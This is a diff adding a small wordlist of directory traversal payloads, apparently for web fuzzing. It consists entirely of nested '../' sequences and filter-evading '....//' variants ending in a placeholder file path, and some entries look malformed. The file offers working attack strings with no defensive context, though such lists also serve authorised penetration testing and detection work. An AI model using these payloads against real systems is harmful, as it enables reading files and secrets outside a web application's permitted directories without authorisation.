@@ -1,0 +1,18 @@
+# Directory Traversal payload
+
+..filepath
+../..filepath
+../../..filepath
+../../../..filepath
+../../../../..filepath
+../../../../../..filepath
+../../../../../../..filepath
+../../../../../../../..filepath
+..../filepath
+....//..../filepath
+....//....//..../filepath
+....//....//....//..../filepath
+....//....//....//....//..../filepath
+....//....//....//....//....//..../filepath
+....//....//....//....//....//....//..../filepath
+....//....//....//....//....//....//....//..../filepath
